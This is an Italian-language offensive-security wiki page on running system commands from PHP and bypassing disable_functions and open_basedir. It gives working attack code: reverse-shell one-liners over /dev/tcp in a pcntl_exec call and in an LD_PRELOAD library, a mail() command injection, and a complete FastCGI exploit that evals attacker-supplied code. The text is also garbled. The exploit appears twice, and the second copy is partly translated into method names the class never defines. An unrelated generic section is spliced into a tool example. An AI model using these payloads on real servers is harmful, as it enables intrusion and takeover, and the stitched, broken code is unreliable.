# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Esecuzione di comandi e codice PHP

### Esecuzione di comandi PHP

**Nota:** Una webshell php [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) pu√≤ **automaticamente** controllare e bypassare la seguente funzione se alcune di esse sono disabilitate.

**exec** - Restituisce l'ultima riga dell'output dei comandi

```bash
echo exec("uname  -a");
```

**passthru** - Passa l'output dei comandi direttamente al browser

```bash
echo passthru("uname -a");
```

**system** - Passa direttamente l'output dei comandi al browser e restituisce l'ultima riga

```bash
echo system("uname -a");
```

**shell\_exec** - Restituisce l'output dei comandi

```bash
echo shell_exec("uname -a");
```

\`\` (backticks) - Stessa funzionalit√† di shell\_exec()

```bash
echo `uname -a`
```

**popen** - Apre una pipe di lettura o scrittura verso un processo di un comando

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - Simile a popen() ma con un maggiore grado di controllo

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

La funzione `preg_replace` √® una funzione di manipolazione delle stringhe in PHP che consente di cercare e sostituire pattern all'interno di una stringa utilizzando espressioni regolari. La sintassi di base della funzione √® la seguente:

```php
preg_replace($pattern, $replacement, $subject);
```

* `$pattern` rappresenta il pattern da cercare nella stringa.
* `$replacement` rappresenta la stringa con cui sostituire il pattern trovato.
* `$subject` rappresenta la stringa in cui cercare il pattern.

Esempio di utilizzo:

```php
$stringa = "Questo √® un esempio di stringa.";
$pattern = "/esempio/";
$sostituzione = "esempio modificato";

$stringa_modificata = preg_replace($pattern, $sostituzione, $stringa);
echo $stringa_modificata;
```

Output:

```
Questo √® un esempio modificato di stringa.
```

La funzione `preg_replace` pu√≤ essere utilizzata per eseguire sostituzioni multiple all'interno di una stringa utilizzando un array di pattern e sostituzioni. Inoltre, √® possibile utilizzare i gruppi di cattura nelle espressioni regolari per riferirsi ai valori catturati nella stringa di sostituzione.

√à importante notare che la funzione `preg_replace` pu√≤ essere utilizzata in modo non sicuro se non viene utilizzata correttamente. Ad esempio, se il pattern di ricerca √® fornito dall'utente, potrebbe essere possibile eseguire attacchi di tipo "Remote Code Execution" (RCE) o "Server Side Request Forgery" (SSRF). Pertanto, √® fondamentale validare e filtrare correttamente i dati in ingresso per prevenire potenziali vulnerabilit√†.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Esegue un programma (di default in PHP moderno e non cos√¨ moderno √® necessario caricare il modulo `pcntl.so` per utilizzare questa funzione)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Questa funzione viene utilizzata per inviare email, ma pu√≤ anche essere abusata per iniettare comandi arbitrari all'interno del parametro `$options`. Questo perch√© la **funzione `mail` di PHP** di solito chiama il binario `sendmail` all'interno del sistema e consente di **inserire opzioni extra**. Tuttavia, non sarai in grado di vedere l'output del comando eseguito, quindi √® consigliabile creare uno script shell che scriva l'output su un file, eseguirlo utilizzando la funzione mail e stampare l'output:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Questa funzione pu√≤ essere utilizzata per caricare dinamicamente un'estensione PHP. Questa funzione potrebbe non essere sempre presente, quindi √® necessario verificare se √® disponibile prima di cercare di sfruttarla. Leggi [questa pagina per imparare come sfruttare questa funzione](disable\_functions-bypass-dl-function.md).

### Esecuzione di codice PHP

Oltre a eval, ci sono altri modi per eseguire codice PHP: include/require possono essere utilizzati per l'esecuzione di codice remoto sotto forma di vulnerabilit√† di inclusione di file locali e inclusione di file remoti.

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**Le funzioni disabilitate** sono le impostazioni che possono essere configurate nei file `.ini` in PHP che **vietano** l'uso delle **funzioni** indicate. **Open basedir** √® l'impostazione che indica a PHP la cartella a cui pu√≤ accedere.\
L'impostazione di PHP solitamente viene configurata nel percorso _/etc/php7/conf.d_ o simile.

Entrambe le configurazioni possono essere visualizzate nell'output di **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## Bypass di open\_basedir

`open_basedir` configurer√† le cartelle a cui PHP pu√≤ accedere, non sarai in grado di scrivere/leggere/eseguire file al di fuori di queste cartelle, ma non sarai nemmeno in grado di elencare altre directory.\
Tuttavia, se in qualche modo riesci ad eseguire codice PHP arbitrario, puoi **provare** il seguente blocco di **codici** per cercare di **bypassare** la restrizione.

### Elenco delle directory con bypass di glob://

In questo primo esempio viene utilizzato il protocollo `glob://` con un bypass del percorso:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Nota1**: Nel percorso puoi anche usare `/e??/*` per elencare `/etc/*` e qualsiasi altra cartella.\
**Nota2**: Sembra che parte del codice sia duplicata, ma in realt√† √® necessario!\
**Nota3**: Questo esempio √® utile solo per elencare le cartelle, non per leggere i file

### Bypass completo di open\_basedir sfruttando FastCGI

Se vuoi **saperne di pi√π su PHP-FPM e FastCGI**, puoi leggere la [prima sezione di questa pagina](disable\_functions-bypass-php-fpm-fastcgi.md).\
Se **`php-fpm`** √® configurato, puoi sfruttarlo per bypassare completamente **open\_basedir**:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

Nota che la prima cosa da fare √® trovare dove si trova il **socket unix di php-fpm**. Di solito si trova sotto `/var/run`, quindi puoi **usare il codice precedente per elencare la directory e trovarlo**.\
Codice preso da [qui](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

```php
* @return String
*/
public function richiesta(array $params, $stdin)
{
$response = '';
$this->connetti();
$request = $this->costruisciPacchetto(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRichiesta = '';
foreach ($params as $chiave => $valore) {
$paramsRichiesta .= $this->costruisciNvpair($chiave, $valore);
}
if ($paramsRichiesta) {
$request .= $this->costruisciPacchetto(self::PARAMS, $paramsRichiesta);
}
$request .= $this->costruisciPacchetto(self::PARAMS, '');
if ($stdin) {
$request .= $this->costruisciPacchetto(self::STDIN, $stdin);
}
$request .= $this->costruisciPacchetto(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->leggiPacchetto();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Richiesta non valida');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Questa app non pu√≤ multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Nuova richiesta rifiutata; troppo occupato [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Valore del ruolo sconosciuto [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// l'exploit reale inizia qui
if (!isset($_REQUEST['cmd'])) {
die("Controlla il tuo input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // payload php -- Non fa nulla
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Chiamata: $uri\n\n";
echo $client->richiesta($params, $code)."\n";
?>
```

Questo script comunicher√† con il **socket Unix di php-fpm** (di solito situato in /var/run se viene utilizzato fpm) per eseguire codice arbitrario. Le impostazioni `open_basedir` verranno sovrascritte dall'attributo **PHP\_VALUE** che viene inviato.\
Nota come `eval` viene utilizzato per eseguire il codice PHP che invii all'interno del parametro **cmd**.\
Nota anche la **riga 324 commentata**, puoi rimuovere il commento e il **payload si connetter√† automaticamente all'URL specificato ed eseguir√† il codice PHP** contenuto l√¨.\
Basta accedere a `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` per ottenere il contenuto del file `/etc/passwd`.

{% hint style="warning" %}
Potresti pensare che allo stesso modo in cui abbiamo sovrascritto la configurazione di `open_basedir` possiamo **sovrascrivere `disable_functions`**. Beh, prova, ma non funzioner√†, apparentemente **`disable_functions` pu√≤ essere configurato solo in un file di configurazione php `.ini`** e le modifiche che apporti utilizzando PHP\_VALUE non saranno efficaci su questa impostazione specifica.
{% endhint %}

## Bypass di disable\_functions

Se riesci ad eseguire codice PHP all'interno di una macchina, probabilmente vorrai passare al livello successivo ed **eseguire comandi di sistema arbitrari**. In questa situazione √® comune scoprire che la maggior parte o tutte le **funzioni PHP** che consentono di **eseguire comandi di sistema sono state disabilitate** in **`disable_functions`.**\
Vediamo quindi come puoi aggirare questa restrizione (se puoi).

### Scoperta automatica del bypass

Puoi utilizzare lo strumento [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) e ti indicher√† quale funzione (se presente) puoi utilizzare per **aggirare** **`disable_functions`**.

### Bypass utilizzando altre funzioni di sistema

Torna all'inizio di questa pagina e **verifica se una delle funzioni di esecuzione dei comandi non √® disabilitata e disponibile nell'ambiente**. Se ne trovi almeno una, sarai in grado di utilizzarla per eseguire comandi di sistema arbitrari.

### Bypass LD\_PRELOAD

√à ben noto che alcune funzioni in PHP come `mail()` **eseguiranno binari all'interno del sistema**. Pertanto, puoi abusarne utilizzando la variabile di ambiente `LD_PRELOAD` per far caricare una libreria arbitraria che pu√≤ eseguire qualsiasi cosa.

#### Funzioni che possono essere utilizzate per aggirare disable\_functions con LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Efficace quando il modulo `php-mbstring` √® installato.
* **`imap_mail`**: Funziona se √® presente il modulo `php-imap`.
* **`libvirt_connect`**: Richiede il modulo `php-libvirt-php`.
* **`gnupg_init`**: Utilizzabile con il modulo `php-gnupg` installato.
* **`new imagick()`**: Questa classe pu√≤ essere abusata per aggirare le restrizioni. Le tecniche di sfruttamento dettagliate possono essere trovate in un [**articolo completo qui**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Puoi trovare [**qui**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) lo script di fuzzing che √® stato utilizzato per trovare queste funzioni.

Ecco una libreria che puoi compilare per abusare della variabile di ambiente `LD_PRELOAD`:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Bypass utilizzando Chankro

Per sfruttare questa configurazione errata, puoi utilizzare [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Questo √® uno strumento che generer√† un **exploit PHP** che devi caricare sul server vulnerabile ed eseguirlo (accedendo ad esso tramite web).\
**Chankro** scriver√† all'interno del disco delle vittime la **libreria e la reverse shell** che desideri eseguire e utilizzer√† il trucco **`LD_PRELOAD` + la funzione PHP `mail()`** per eseguire la reverse shell.

Nota che per utilizzare **Chankro**, `mail` e `putenv` **non possono apparire nell'elenco delle `disable_functions`**.\
Nell'esempio seguente puoi vedere come **creare un exploit chankro** per **arch 64**, che eseguir√† `whoami` e salver√† l'output in _/tmp/chankro\_shell.out_, chankro scriver√† la **libreria e il payload** in _/tmp_ e l'**exploit finale** sar√† chiamato **bicho.php** (questo √® il file che devi caricare sul server delle vittime):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```

## Funzioni utili di PHP per disabilitare funzioni e bypassare open\_basedir

In alcuni scenari di pentesting, potresti trovarti ad affrontare restrizioni imposte dalle funzioni di PHP o dalla configurazione di open\_basedir. Tuttavia, esistono alcune funzioni utili che puoi utilizzare per disabilitare le funzioni di PHP o bypassare le restrizioni di open\_basedir.

### Disabilitare funzioni di PHP

Per disabilitare le funzioni di PHP, puoi utilizzare la direttiva `disable_functions` nel file di configurazione di PHP (`php.ini`). Questa direttiva consente di specificare un elenco di funzioni che devono essere disabilitate.

Ad esempio, se vuoi disabilitare la funzione `exec`, puoi aggiungere la seguente riga nel file `php.ini`:

```plaintext
disable_functions = exec
```

Dopo aver apportato questa modifica, la funzione `exec` non sar√† pi√π disponibile.

### Bypassare open\_basedir

La configurazione di `open_basedir` in PHP limita i file che possono essere aperti da uno script PHP solo a determinate directory. Tuttavia, esistono alcune tecniche che puoi utilizzare per bypassare questa restrizione.

Una tecnica comune consiste nell'utilizzare la funzione `symlink` per creare un collegamento simbolico a una directory consentita. In questo modo, puoi accedere ai file al di fuori della directory consentita.

Ad esempio, supponiamo che la directory consentita sia `/var/www/html` e tu voglia accedere al file `/etc/passwd`. Puoi creare un collegamento simbolico utilizzando la seguente riga di codice:

```php
symlink('/etc/passwd', '/var/www/html/passwd');
```

In questo modo, puoi accedere al file `/etc/passwd` tramite il percorso `/var/www/html/passwd`.

### Conclusioni

Le funzioni di PHP possono essere disabilitate utilizzando la direttiva `disable_functions` nel file di configurazione di PHP. Inoltre, puoi bypassare le restrizioni di `open_basedir` utilizzando la funzione `symlink` per creare collegamenti simbolici a directory consentite. Queste tecniche possono essere utili durante un pentesting per superare le restrizioni imposte e ottenere accesso a risorse non consentite.

```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Se scopri che la funzione **mail** √® bloccata dalle funzioni disabilitate, potresti comunque essere in grado di utilizzare la funzione **mb\_send\_mail**.\
Ulteriori informazioni su questa tecnica e Chankro qui: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" utilizzando le capacit√† di PHP

Nota che utilizzando **PHP** puoi **leggere e scrivere file, creare directory e cambiare le autorizzazioni**.\
Puoi persino **eseguire il dump dei database**.\
Forse utilizzando **PHP** per **enumerare** la casella puoi trovare un modo per elevare i privilegi/eseguire comandi (ad esempio leggere una chiave ssh privata).

Ho creato una webshell che rende molto facile eseguire queste azioni (nota che la maggior parte delle webshell ti offrir√† anche queste opzioni): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass dipendenti dai moduli/versioni

Ci sono diversi modi per bypassare le disable\_functions se viene utilizzato un modulo specifico o sfruttare una specifica versione di PHP:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Bypass con FFI - Foreign Function Interface abilitata**](https://github.com/carlospolop/hacktricks/blob/it/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Bypass tramite mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**funzione dl**](disable\_functions-bypass-dl-function.md)
* [**Questo exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - sfruttabile con piccole modifiche al PoC
* 7.0 - tutte le versioni fino ad oggi
* 7.1 - tutte le versioni fino ad oggi
* 7.2 - tutte le versioni fino ad oggi
* 7.3 - tutte le versioni fino ad oggi
* 7.4 - tutte le versioni fino ad oggi
* 8.0 - tutte le versioni fino ad oggi
* [**Da 7.0 a 8.0 exploit (solo Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Strumento automatico**

Lo script seguente prova alcuni dei metodi commentati qui:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Altre interessanti funzioni di PHP

### Elenco delle funzioni che accettano callback

Queste funzioni accettano un parametro di tipo stringa che potrebbe essere utilizzato per chiamare una funzione a scelta dell'attaccante. A seconda della funzione, l'attaccante potrebbe o meno avere la possibilit√† di passare un parametro. In tal caso potrebbe essere utilizzata una funzione di divulgazione delle informazioni come phpinfo().

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Elenco seguente da qui](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
